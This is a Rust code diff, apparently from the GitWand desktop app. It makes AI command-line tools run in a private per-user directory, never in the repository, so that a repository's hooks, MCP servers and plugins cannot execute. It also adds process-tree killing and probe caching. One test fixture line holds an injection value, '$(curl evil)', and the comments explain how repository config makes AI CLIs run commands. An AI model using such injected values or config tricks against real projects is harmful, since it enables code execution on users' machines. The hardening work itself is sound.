@@ -722,7 +722,6 @@ fn detect_claude_cli_inner() -> Result<ClaudeCliInfo, String> {
 pub(crate) async fn claude_cli_prompt(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     output_format: Option<String>,
     model: Option<String>,
     effort: Option<String>,
@@ -733,7 +732,7 @@ pub(crate) async fn claude_cli_prompt(
     // other IPC command. `spawn_blocking` puts it on the blocking pool
     // instead, which is what `ops.rs` already does for git subprocesses.
     tauri::async_runtime::spawn_blocking(move || {
-        claude_cli_prompt_inner(prompt, system_prompt, cwd, output_format, model, effort)
+        claude_cli_prompt_inner(prompt, system_prompt, output_format, model, effort)
     })
     .await
     .map_err(|e| e.to_string())?
@@ -795,12 +794,24 @@ fn parse_claude_caps(help: &str) -> ClaudeCaps {
 }
 
 /// Run `cmd` (stdin closed, stderr dropped) and return its stdout when it
-/// exits successfully within `timeout`; `None` on failure or timeout, after
-/// killing it. stdout is drained on its own thread so a large output cannot
-/// stall the child against a full pipe.
+/// exits successfully within `timeout`; `None` on failure or timeout.
+///
+/// On timeout the whole process tree is killed, not just the direct child: a
+/// wrapper (`claude.cmd` → `cmd.exe` → `node` on Windows, a shell script that
+/// does not `exec` on Unix) leaves a grandchild holding stdout open, and
+/// waiting for EOF would then hang the generation. On Unix the child leads
+/// its own process group, killed as a whole; on Windows `taskkill /T /F`
+/// kills the tree. The reader thread is never waited on past a short grace
+/// period either: if something still holds the pipe, it is left behind.
 fn stdout_within(mut cmd: std::process::Command, timeout: std::time::Duration) -> Option<String> {
     use std::io::Read;
     use std::process::Stdio;
+    use std::time::{Duration, Instant};
+    #[cfg(unix)]
+    {
+        use std::os::unix::process::CommandExt;
+        cmd.process_group(0);
+    }
     let mut child = cmd
         .stdin(Stdio::null())
         .stdout(Stdio::piped())
@@ -808,31 +819,50 @@ fn stdout_within(mut cmd: std::process::Command, timeout: std::time::Duration) -
         .spawn()
         .ok()?;
     let mut out = child.stdout.take()?;
-    let reader = std::thread::spawn(move || {
+    let (tx, rx) = std::sync::mpsc::channel();
+    std::thread::spawn(move || {
         let mut buf = Vec::new();
         let _ = out.read_to_end(&mut buf);
-        buf
+        let _ = tx.send(buf);
     });
-    let deadline = std::time::Instant::now() + timeout;
+    let deadline = Instant::now() + timeout;
     let status = loop {
         match child.try_wait() {
             Ok(Some(st)) => break Some(st),
-            Ok(None) if std::time::Instant::now() < deadline => {
-                std::thread::sleep(std::time::Duration::from_millis(20))
-            }
+            Ok(None) if Instant::now() < deadline => std::thread::sleep(Duration::from_millis(20)),
             _ => {
-                let _ = child.kill();
-                let _ = child.wait();
+                kill_tree(&mut child);
                 break None;
             }
         }
     };
-    let buf = reader.join().ok()?;
-    status
-        .filter(|s| s.success())
-        .map(|_| String::from_utf8_lossy(&buf).into_owned())
+    status.filter(|s| s.success())?;
+    // Exited: its stdout reaches EOF unless a grandchild still holds it.
+    let buf = rx.recv_timeout(Duration::from_secs(2)).ok()?;
+    Some(String::from_utf8_lossy(&buf).into_owned())
 }
 
+/// Kill `child` and everything it started (see `stdout_within`).
+fn kill_tree(child: &mut std::process::Child) {
+    #[cfg(unix)]
+    {
+        // The child leads its own group (`process_group(0)`): its pid is the
+        // group id. SAFETY: plain syscall on a pid we own; no memory involved.
+        if let Ok(pgid) = libc::pid_t::try_from(child.id()) {
+            unsafe {
+                libc::killpg(pgid, libc::SIGKILL);
+            }
+        }
+    }
+    #[cfg(windows)]
+    {
+        let _ = hidden_cmd("taskkill")
+            .args(["/T", "/F", "/PID", &child.id().to_string()])
+            .output();
+    }
+    let _ = child.kill();
+    let _ = child.wait();
+}
 /// Identity of a binary for the capability cache: path, size and mtime, so an
 /// upgraded CLI in place is probed again.
 fn binary_identity(binary: &str) -> (String, u64, Option<std::time::SystemTime>) {
@@ -845,50 +875,83 @@ fn binary_identity(binary: &str) -> (String, u64, Option<std::time::SystemTime>)
 }
 
 /// `parse_claude_caps` of `binary --help` (10 s at most), cached per binary
-/// identity. A failed, timed-out or empty probe is not cached: the next run
-/// probes again rather than staying on the most restrictive guess.
+/// identity. A failed, timed-out or empty probe is cached as a failure for
+/// 5 minutes only: retried later rather than kept on the most restrictive
+/// guess forever, without costing 10 s on every generation meanwhile.
 fn claude_caps(binary: &str) -> ClaudeCaps {
     use std::collections::HashMap;
     use std::sync::{Mutex, OnceLock};
+    use std::time::{Duration, Instant};
+    const RETRY_FAILED_AFTER: Duration = Duration::from_secs(5 * 60);
     type Key = (String, u64, Option<std::time::SystemTime>);
-    static CACHE: OnceLock<Mutex<HashMap<Key, ClaudeCaps>>> = OnceLock::new();
+    #[derive(Clone, Copy)]
+    enum Probe {
+        Known(ClaudeCaps),
+        Failed(Instant),
+    }
+    static CACHE: OnceLock<Mutex<HashMap<Key, Probe>>> = OnceLock::new();
     let cache = CACHE.get_or_init(|| Mutex::new(HashMap::new()));
     let key = binary_identity(binary);
-    if let Some(c) = cache.lock().ok().and_then(|m| m.get(&key).copied()) {
-        return c;
+    match cache.lock().ok().and_then(|m| m.get(&key).copied()) {
+        Some(Probe::Known(c)) => return c,
+        Some(Probe::Failed(at)) if at.elapsed() < RETRY_FAILED_AFTER => {
+            return ClaudeCaps::default()
+        }
+        _ => {}
     }
     let mut cmd = ai_cmd(binary, AiCli::Claude);
     cmd.arg("--help");
-    let Some(help) = stdout_within(cmd, std::time::Duration::from_secs(10)) else {
-        return ClaudeCaps::default();
+    let probe = match stdout_within(cmd, Duration::from_secs(10)) {
+        Some(help) if !help.trim().is_empty() => Probe::Known(parse_claude_caps(&help)),
+        _ => Probe::Failed(Instant::now()),
     };
-    if help.trim().is_empty() {
-        return ClaudeCaps::default();
-    }
-    let caps = parse_claude_caps(&help);
     if let Ok(mut m) = cache.lock() {
-        m.insert(key, caps);
+        m.insert(key, probe);
     }
-    caps
+    match probe {
+        Probe::Known(c) => c,
+        Probe::Failed(_) => ClaudeCaps::default(),
+    }
+}
+/// Base of the private working directory: the user's own cache directory
+/// (`~/Library/Caches`, `$XDG_CACHE_HOME` if absolute else `~/.cache`,
+/// `%LOCALAPPDATA%`), the home directory failing that — never the shared
+/// system temp dir: on Linux `/tmp` is world-writable, and another local user
+/// could plant a `.claude/settings.json`, `opencode.json` or
+/// `.codex/config.toml` there.
+fn neutral_dir_base() -> Option<PathBuf> {
+    dirs::cache_dir().or_else(dirs::home_dir)
 }
 
-/// Private working directory for the AI CLIs that must not run inside the
-/// repository: under the user's own cache directory (`~/Library/Caches`,
-/// `~/.cache`, `%LOCALAPPDATA%`), never the shared system temp dir — on Linux
-/// `/tmp` is world-writable, and another local user could plant a
-/// `.claude/settings.json`, `opencode.json` or `.codex/config.toml` there.
+/// Private working directory every AI CLI runs in (see `ai_prompt_cmd`).
+/// Unit tests use a per-process directory under the temp dir instead, so they
+/// neither touch the real cache nor depend on being allowed to write it.
 fn ai_neutral_dir() -> Result<PathBuf, String> {
-    let base = dirs::cache_dir()
-        .or_else(dirs::home_dir)
+    #[cfg(not(test))]
+    let base = neutral_dir_base()
         .ok_or_else(|| "No per-user directory to run the AI CLI in".to_string())?;
+    #[cfg(test)]
+    let base = std::env::temp_dir().join(format!("gitwand-test-cache-{}", std::process::id()));
     prepare_neutral_dir(&base.join("gitwand").join("ai-cwd"))
 }
-
-/// Create `dir` if needed and check it is a real directory (not a symlink)
-/// only its owner can enter (0700 on Unix; setting the mode fails unless we
-/// own it). It is made an empty git repository so `codex exec` accepts it,
-/// and since nobody trusted it, Codex loads no project config from it.
+/// Create `dir` if needed and check it is a real directory, not a symlink,
+/// owned by the current user, made an empty git repository so `codex exec`
+/// accepts it (nobody trusted it, so Codex loads no project config from it).
+///
+/// Its mode is set to 0700. When that does not stick — NFS/SMB, exFAT and
+/// other filesystems that ignore Unix modes — the setup goes on with a
+/// warning rather than failing: the directory still belongs to the user and
+/// sits in their own cache directory, whose parent permissions are what kept
+/// other users out to begin with; refusing would disable Codex, opencode and
+/// the other CLIs entirely on such setups. A directory owned by someone else
+/// is refused.
+///
+/// Serialised: two generations starting together would otherwise both run
+/// `git init` and the loser fail on git's config lock.
 fn prepare_neutral_dir(dir: &std::path::Path) -> Result<PathBuf, String> {
+    use std::sync::Mutex;
+    static SETUP: Mutex<()> = Mutex::new(());
+    let _guard = SETUP.lock().unwrap_or_else(|e| e.into_inner());
     let fail = |what: &str, e: &dyn std::fmt::Display| {
         format!("AI working directory {}: {} ({})", dir.display(), what, e)
     };
@@ -899,15 +962,22 @@ fn prepare_neutral_dir(dir: &std::path::Path) -> Result<PathBuf, String> {
     }
     #[cfg(unix)]
     {
-        use std::os::unix::fs::PermissionsExt;
-        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))
-            .map_err(|e| fail("cannot restrict permissions", &e))?;
+        use std::os::unix::fs::{MetadataExt, PermissionsExt};
+        // SAFETY: getuid has no preconditions and cannot fail.
+        let uid = unsafe { libc::getuid() };
+        if meta.uid() != uid {
+            return Err(fail("belongs to another user", &meta.uid()));
+        }
+        let _ = std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700));
         let mode = std::fs::symlink_metadata(dir)
-            .map_err(|e| fail("cannot inspect", &e))?
-            .permissions()
-            .mode();
+            .map(|m| m.permissions().mode())
+            .unwrap_or(0o777);
         if mode & 0o077 != 0 {
-            return Err(fail("is accessible to other users", &format!("{:o}", mode)));
+            eprintln!(
+                "[ai] {} keeps mode {:o} (filesystem ignores Unix modes?); using it anyway",
+                dir.display(),
+                mode & 0o777
+            );
         }
     }
     if !dir.join(".git").exists() {
@@ -917,13 +987,32 @@ fn prepare_neutral_dir(dir: &std::path::Path) -> Result<PathBuf, String> {
             .output()
             .map(|o| o.status.success())
             .unwrap_or(false);
-        if !ok {
+        // Another process may have initialised it meanwhile: what matters is
+        // that it is a repository now.
+        if !ok && !dir.join(".git").exists() {
             return Err(fail("cannot initialise", &"git init failed"));
         }
     }
     Ok(dir.to_path_buf())
 }
 
+/// `ai_cmd` for a prompt run, in the given private working directory.
+fn ai_prompt_cmd_in(binary: &str, cli: AiCli, dir: &std::path::Path) -> std::process::Command {
+    let mut cmd = ai_cmd(binary, cli);
+    cmd.current_dir(dir);
+    cmd
+}
+
+/// `ai_cmd` for a prompt run: every AI CLI runs in the private neutral
+/// directory (`ai_neutral_dir`), never in the repository. The CLIs load
+/// configuration from their working directory — project hooks for Claude,
+/// `opencode.json` MCP servers and `.opencode/plugin/*` for opencode, a
+/// trusted project's `.codex/config.toml` MCP servers for Codex, all verified
+/// live to run a repository's commands — and the prompt already carries the
+/// content they need. Fails rather than fall back to the repository.
+fn ai_prompt_cmd(binary: &str, cli: AiCli) -> Result<std::process::Command, String> {
+    Ok(ai_prompt_cmd_in(binary, cli, &ai_neutral_dir()?))
+}
 /// Flags that confine a `claude -p` run to producing text. The prompt carries
 /// untrusted repo content, so nothing may act on the machine, read it, or
 /// reach the network, whatever the user's Claude settings allow:
@@ -952,26 +1041,9 @@ fn claude_lockdown_args(caps: ClaudeCaps) -> Vec<&'static str> {
     args
 }
 
-/// Directory to run `claude -p` in. The repository when its project settings
-/// can be ignored (`--setting-sources`); otherwise the private neutral
-/// directory (`ai_neutral_dir`), so an older CLI cannot pick up the
-/// repository's hooks — the prompt already carries the content it needs.
-fn claude_run_dir(
-    caps: ClaudeCaps,
-    cwd: Option<&str>,
-    neutral: &dyn Fn() -> Result<PathBuf, String>,
-) -> Result<Option<PathBuf>, String> {
-    if caps.setting_sources {
-        Ok(cwd.filter(|d| !d.trim().is_empty()).map(PathBuf::from))
-    } else {
-        neutral().map(Some)
-    }
-}
-
 fn claude_cli_prompt_inner(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     output_format: Option<String>,
     model: Option<String>,
     effort: Option<String>,
@@ -995,7 +1067,7 @@ fn claude_cli_prompt_inner(
     // file snapshots; strip NULs defensively before handing it to the CLI.
     let full_prompt = full_prompt.replace('\0', "");
 
-    let mut cmd = ai_cmd(&binary, AiCli::Claude);
+    let mut cmd = ai_prompt_cmd(&binary, AiCli::Claude)?;
     // `-p` with no positional prompt reads it from stdin: the prompt holds
     // repository content and must stay out of the argv (see output_with_stdin).
     cmd.args(["-p", "--output-format", &fmt]);
@@ -1012,9 +1084,6 @@ fn claude_cli_prompt_inner(
     let caps = claude_caps(&binary);
     cmd.args(claude_lockdown_args(caps));
     strip_claude_auth_env(&mut cmd);
-    if let Some(dir) = claude_run_dir(caps, cwd.as_deref(), &ai_neutral_dir)? {
-        cmd.current_dir(dir);
-    }
 
     let output = output_with_stdin(cmd, full_prompt)
         .map_err(|e| format!("Failed to run claude CLI: {}", e))?;
@@ -1095,12 +1164,11 @@ fn detect_codex_cli_inner() -> Result<CodexCliInfo, String> {
 pub(crate) async fn codex_cli_prompt(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     model: Option<String>,
     effort: Option<String>,
 ) -> Result<String, String> {
     tauri::async_runtime::spawn_blocking(move || {
-        codex_cli_prompt_inner(prompt, system_prompt, cwd, model, effort)
+        codex_cli_prompt_inner(prompt, system_prompt, model, effort)
     })
     .await
     .map_err(|e| e.to_string())?
@@ -1109,7 +1177,6 @@ pub(crate) async fn codex_cli_prompt(
 fn codex_cli_prompt_inner(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     model: Option<String>,
     effort: Option<String>,
 ) -> Result<String, String> {
@@ -1127,7 +1194,7 @@ fn codex_cli_prompt_inner(
     // Strip NUL bytes defensively — binary content can leak them into a diff.
     let full_prompt = full_prompt.replace('\0', "");
 
-    let mut cmd = ai_cmd(&binary, AiCli::Codex);
+    let mut cmd = ai_prompt_cmd(&binary, AiCli::Codex)?;
     cmd.arg("exec");
     // GitWand only wants a text answer, and the prompt carries untrusted repo
     // content: pin the sandbox to read-only (no writes, no network) whatever
@@ -1148,14 +1215,9 @@ fn codex_cli_prompt_inner(
     // `-` makes `codex exec` read the prompt from stdin, keeping repository
     // content out of the argv (see output_with_stdin).
     cmd.arg("-");
-    // Never the repository: a project `.codex/config.toml` is loaded once the
-    // user has trusted the folder in Codex, and its MCP servers are commands
-    // Codex starts — a cloned repo's server ran on "generate", verified live
-    // on codex-cli 0.147 with a trusted project. `-c mcp_servers={}` does not
-    // remove them (it merges). The prompt carries the content; Codex needs no
-    // repository to answer.
-    let _ = cwd;
-    cmd.current_dir(ai_neutral_dir()?);
+    // Runs in the neutral directory (ai_prompt_cmd): a trusted project's
+    // `.codex/config.toml` MCP servers ran from the repository, verified live
+    // on codex-cli 0.147. `-c mcp_servers={}` does not remove them (it merges).
 
     let output = output_with_stdin(cmd, full_prompt)
         .map_err(|e| format!("Failed to run codex CLI: {}", e))?;
@@ -1419,11 +1481,10 @@ fn detect_antigravity_cli_inner() -> Result<AntigravityCliInfo, String> {
 pub(crate) async fn antigravity_cli_prompt(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     model: Option<String>,
 ) -> Result<String, String> {
     tauri::async_runtime::spawn_blocking(move || {
-        antigravity_cli_prompt_inner(prompt, system_prompt, cwd, model)
+        antigravity_cli_prompt_inner(prompt, system_prompt, model)
     })
     .await
     .map_err(|e| e.to_string())?
@@ -1432,7 +1493,6 @@ pub(crate) async fn antigravity_cli_prompt(
 fn antigravity_cli_prompt_inner(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     model: Option<String>,
 ) -> Result<String, String> {
     let binary =
@@ -1449,7 +1509,7 @@ fn antigravity_cli_prompt_inner(
     // `\0` makes the spawn fail with "nul byte found in provided data".
     let full_prompt = full_prompt.replace('\0', "");
 
-    let mut cmd = ai_cmd(&binary, AiCli::Antigravity);
+    let mut cmd = ai_prompt_cmd(&binary, AiCli::Antigravity)?;
     // Flags precede the positional prompt passed via `-p`.
     if let Some(m) = model.as_ref() {
         if !m.trim().is_empty() {
@@ -1457,11 +1517,6 @@ fn antigravity_cli_prompt_inner(
         }
     }
     cmd.args(["-p", full_prompt.as_str()]);
-    if let Some(dir) = cwd {
-        if !dir.trim().is_empty() {
-            cmd.current_dir(dir);
-        }
-    }
 
     let output = cmd
         .output()
@@ -1569,11 +1624,10 @@ fn detect_opencode_cli_inner() -> Result<OpencodeCliInfo, String> {
 pub(crate) async fn opencode_cli_prompt(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     model: Option<String>,
 ) -> Result<String, String> {
     tauri::async_runtime::spawn_blocking(move || {
-        opencode_cli_prompt_inner(prompt, system_prompt, cwd, model)
+        opencode_cli_prompt_inner(prompt, system_prompt, model)
     })
     .await
     .map_err(|e| e.to_string())?
@@ -1582,7 +1636,6 @@ pub(crate) async fn opencode_cli_prompt(
 fn opencode_cli_prompt_inner(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     model: Option<String>,
 ) -> Result<String, String> {
     let binary =
@@ -1606,12 +1659,10 @@ fn opencode_cli_prompt_inner(
     // content out of the argv. There is no argv fallback: an opencode too old
     // to read stdin fails visibly (see `opencode_result`) instead of quietly
     // putting the repository content back on the command line.
-    // Never in the repository: opencode loads `opencode.json` and
-    // `.opencode/plugin/*` from its working directory — a cloned repo's local
-    // MCP server and plugin both ran on "generate", verified live on opencode
-    // 1.17.11. OPENCODE_DISABLE_PROJECT_CONFIG stops the former but not the
-    // plugin, hence the neutral directory. The prompt carries the content.
-    let _ = cwd;
+    // Runs in the neutral directory: a repository's `opencode.json` MCP
+    // server and `.opencode/plugin/*` both ran on "generate", verified live on
+    // opencode 1.17.11. OPENCODE_DISABLE_PROJECT_CONFIG stops the former but
+    // not the plugin.
     let output = output_with_stdin(
         opencode_run_cmd(&binary, model.as_ref(), &ai_neutral_dir()?),
         full_prompt,
@@ -1634,29 +1685,62 @@ fn opencode_result(output: &std::process::Output) -> Result<String, String> {
     if format!("{}{}", stderr, stdout).contains("You must provide a message") {
         return Err(STDIN_HINT.to_string());
     }
-    // Provider, auth or rate-limit errors land on stderr, whatever the exit.
-    if !stderr.is_empty() {
+    if !output.status.success() {
+        let detail = if stderr.is_empty() {
+            stdout.trim().to_string()
+        } else {
+            stderr
+        };
+        return Err(if detail.is_empty() {
+            "opencode CLI a échoué sans message".to_string()
+        } else {
+            detail
+        });
+    }
+    // Exit 0 with an empty answer. A provider, auth or quota error on stderr
+    // is the message to show; log or update lines are not, and the stdin
+    // hint stays — with the end of stderr, in case it helps.
+    if stderr_looks_like_error(&stderr) {
         return Err(stderr);
     }
-    if output.status.success() {
-        // Exit 0, nothing on either stream: an opencode that ignored stdin.
-        return Err(STDIN_HINT.to_string());
-    }
-    let stdout = stdout.trim().to_string();
-    Err(if stdout.is_empty() {
-        "opencode CLI a échoué sans message".to_string()
+    let tail: Vec<&str> = stderr.lines().rev().take(5).collect();
+    Err(if tail.is_empty() {
+        STDIN_HINT.to_string()
     } else {
-        stdout
+        let tail: Vec<&str> = tail.into_iter().rev().collect();
+        format!("{}\n{}", STDIN_HINT, tail.join("\n"))
     })
 }
 
+/// Whether CLI stderr reads like an error report rather than log noise.
+fn stderr_looks_like_error(stderr: &str) -> bool {
+    let l = stderr.to_ascii_lowercase();
+    [
+        "error",
+        "failed",
+        "unauthorized",
+        "forbidden",
+        "denied",
+        "invalid",
+        "quota",
+        "rate limit",
+        "rate-limit",
+        "exceeded",
+        "exception",
+        " 401",
+        " 403",
+        " 429",
+    ]
+    .iter()
+    .any(|w| l.contains(w))
+}
 /// `opencode run`, locked down; the prompt goes on stdin.
 fn opencode_run_cmd(
     binary: &str,
     model: Option<&String>,
     run_dir: &std::path::Path,
 ) -> std::process::Command {
-    let mut cmd = ai_cmd(binary, AiCli::Opencode);
+    let mut cmd = ai_prompt_cmd_in(binary, AiCli::Opencode, run_dir);
     cmd.arg("run");
     // GitWand only wants a text answer, and the prompt carries untrusted repo
     // content: deny the tools that act on the machine or reach the network.
@@ -1674,7 +1758,6 @@ fn opencode_run_cmd(
             cmd.args(["--model", m.trim()]);
         }
     }
-    cmd.current_dir(run_dir);
     cmd
 }
 
@@ -1812,12 +1895,11 @@ fn detect_copilot_cli_inner() -> Result<CopilotCliInfo, String> {
 pub(crate) async fn copilot_cli_prompt(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     model: Option<String>,
     effort: Option<String>,
 ) -> Result<String, String> {
     tauri::async_runtime::spawn_blocking(move || {
-        copilot_cli_prompt_inner(prompt, system_prompt, cwd, model, effort)
+        copilot_cli_prompt_inner(prompt, system_prompt, model, effort)
     })
     .await
     .map_err(|e| e.to_string())?
@@ -1826,7 +1908,6 @@ pub(crate) async fn copilot_cli_prompt(
 fn copilot_cli_prompt_inner(
     prompt: String,
     system_prompt: Option<String>,
-    cwd: Option<String>,
     model: Option<String>,
     effort: Option<String>,
 ) -> Result<String, String> {
@@ -1846,7 +1927,7 @@ fn copilot_cli_prompt_inner(
     // `\0` makes the spawn fail with "nul byte found in provided data".
     let full_prompt = full_prompt.replace('\0', "");
 
-    let mut cmd = ai_cmd(&binary, AiCli::Copilot);
+    let mut cmd = ai_prompt_cmd(&binary, AiCli::Copilot)?;
     // `--no-color` keeps stdout free of ANSI escapes. Flags precede the
     // positional prompt passed via `-p`.
     cmd.arg("--no-color");
@@ -1866,11 +1947,6 @@ fn copilot_cli_prompt_inner(
         cmd.args(["--reasoning-effort", e]);
     }
     cmd.args(["-p", full_prompt.as_str()]);
-    if let Some(dir) = cwd {
-        if !dir.trim().is_empty() {
-            cmd.current_dir(dir);
-        }
-    }
 
     let output = cmd
         .output()
@@ -2119,7 +2195,6 @@ mod tests {
                 .map(|_| {
                     tokio::spawn(claude_cli_prompt(
                         "ping".to_string(),
-                        None,
                         None,
                         None,
                         None,
@@ -2536,10 +2611,6 @@ env_key = "$(curl evil)"
 mod lockdown_tests {
     use super::*;
 
-    fn neutral() -> Result<PathBuf, String> {
-        Ok(PathBuf::from("/neutral"))
-    }
-
     const HELP_2_1: &str = "  --strict-mcp-config   Only use MCP servers from --mcp-config\n  \
         --setting-sources <sources>   Comma-separated list\n  \
         --tools <tools...>   Specify the list of available tools\n  \
@@ -2585,11 +2656,6 @@ mod lockdown_tests {
         ] {
             assert!(args.contains(&t), "{t} not denied");
         }
-        // The repository may stay the cwd: its settings are not loaded.
-        assert_eq!(
-            claude_run_dir(caps, Some("/repo"), &neutral),
-            Ok(Some(PathBuf::from("/repo")))
-        );
     }
 
     #[test]
@@ -2600,13 +2666,6 @@ mod lockdown_tests {
         assert!(!args.contains(&"--setting-sources"));
         assert!(!args.contains(&"--strict-mcp-config"));
         assert!(args.contains(&"--disallowedTools") && args.contains(&"Read"));
-        // Without --setting-sources the repo's hooks would load: neutral cwd.
-        assert_eq!(
-            claude_run_dir(caps, Some("/repo"), &neutral),
-            Ok(Some(PathBuf::from("/neutral")))
-        );
-        // No neutral directory: refuse rather than fall back to the repo.
-        assert!(claude_run_dir(caps, Some("/repo"), &|| Err("no".into())).is_err());
     }
 
     #[cfg(unix)]
@@ -2622,25 +2681,33 @@ mod lockdown_tests {
     #[cfg(unix)]
     #[test]
     fn opencode_empty_or_refused_prompt_is_an_error() {
+        let hint = |e: &str| e.contains("stdin");
         assert_eq!(
             opencode_result(&output(0, "feat: x\n", "")).unwrap(),
             "feat: x\n"
         );
         // An old opencode that ignored stdin: exit 0, nothing said.
-        assert!(opencode_result(&output(0, "  \n", "")).is_err());
+        assert!(hint(&opencode_result(&output(0, "  \n", "")).unwrap_err()));
         let err =
             opencode_result(&output(1, "", "You must provide a message or a command")).unwrap_err();
-        assert!(err.contains("stdin"), "{err}");
+        assert!(hint(&err), "{err}");
+        // Non-zero exit: stderr is the message.
         assert_eq!(opencode_result(&output(2, "", "boom")).unwrap_err(), "boom");
-        // Exit 0, empty answer, but a provider error on stderr: show that.
-        assert_eq!(
-            opencode_result(&output(0, "", "Error: rate limited\n")).unwrap_err(),
-            "Error: rate limited"
-        );
         assert_eq!(
             opencode_result(&output(3, "", "")).unwrap_err(),
             "opencode CLI a échoué sans message"
         );
+        // Exit 0, empty answer, a provider error on stderr: show that.
+        assert_eq!(
+            opencode_result(&output(0, "", "Error: rate limited\n")).unwrap_err(),
+            "Error: rate limited"
+        );
+        // Exit 0, empty answer, only log noise on stderr: keep the hint,
+        // with the end of stderr.
+        let err =
+            opencode_result(&output(0, "", "INFO starting\nupdate available: 1.18")).unwrap_err();
+        assert!(hint(&err), "{err}");
+        assert!(err.ends_with("update available: 1.18"), "{err}");
     }
 }
 
@@ -2674,6 +2741,22 @@ mod neutral_dir_tests {
         let _ = std::fs::remove_dir_all(d.parent().unwrap());
     }
 
+    #[test]
+    fn concurrent_first_use_initialises_once_without_failing() {
+        let d = scratch("race").join("ai-cwd");
+        let handles: Vec<_> = (0..8)
+            .map(|_| {
+                let d = d.clone();
+                std::thread::spawn(move || prepare_neutral_dir(&d))
+            })
+            .collect();
+        for h in handles {
+            assert_eq!(h.join().unwrap(), Ok(d.clone()));
+        }
+        assert!(d.join(".git").is_dir());
+        let _ = std::fs::remove_dir_all(d.parent().unwrap());
+    }
+
     #[cfg(unix)]
     #[test]
     fn neutral_dir_refuses_a_symlink() {
@@ -2687,10 +2770,69 @@ mod neutral_dir_tests {
     }
 
     #[test]
-    fn neutral_dir_is_per_user_not_the_shared_temp_dir() {
+    fn neutral_dir_base_is_per_user_not_the_shared_temp_dir() {
+        // Location only: nothing is created in the real cache directory.
+        if let Some(base) = neutral_dir_base() {
+            assert!(
+                !base.starts_with(std::env::temp_dir()),
+                "{}",
+                base.display()
+            );
+            if let Some(home) = dirs::home_dir() {
+                assert!(base.starts_with(home), "{}", base.display());
+            }
+        }
+        // Unit tests themselves use a per-process directory under temp.
         let d = ai_neutral_dir().unwrap();
-        assert!(!d.starts_with("/tmp"), "{}", d.display());
+        assert!(d.starts_with(std::env::temp_dir()));
         assert!(d.ends_with(std::path::Path::new("gitwand").join("ai-cwd")));
+    }
+
+    #[test]
+    fn prompt_commands_run_in_the_neutral_dir() {
+        let cmd = ai_prompt_cmd_in("claude", AiCli::Claude, std::path::Path::new("/neutral"));
+        assert_eq!(
+            cmd.get_current_dir(),
+            Some(std::path::Path::new("/neutral"))
+        );
+        for cli in [
+            AiCli::Claude,
+            AiCli::Codex,
+            AiCli::Opencode,
+            AiCli::Copilot,
+            AiCli::Antigravity,
+        ] {
+            let cmd = ai_prompt_cmd("x", cli).unwrap();
+            assert_eq!(
+                cmd.get_current_dir(),
+                Some(ai_neutral_dir().unwrap().as_path())
+            );
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_timed_out_probe_does_not_hang_on_a_grandchild_holding_stdout() {
+        // A wrapper that does not `exec`: the grandchild keeps stdout open.
+        let mut wrapper = std::process::Command::new("sh");
+        wrapper.args(["-c", "sleep 30 & sleep 30"]);
+        let t = std::time::Instant::now();
+        assert!(stdout_within(wrapper, std::time::Duration::from_millis(300)).is_none());
+        assert!(
+            t.elapsed() < std::time::Duration::from_secs(5),
+            "took {:?}",
+            t.elapsed()
+        );
+        // A wrapper whose grandchild outlives a successful exit: bounded too.
+        let mut leaky = std::process::Command::new("sh");
+        leaky.args(["-c", "echo hi; sleep 30 &"]);
+        let t = std::time::Instant::now();
+        let _ = stdout_within(leaky, std::time::Duration::from_secs(5));
+        assert!(
+            t.elapsed() < std::time::Duration::from_secs(8),
+            "took {:?}",
+            t.elapsed()
+        );
     }
 
     #[test]
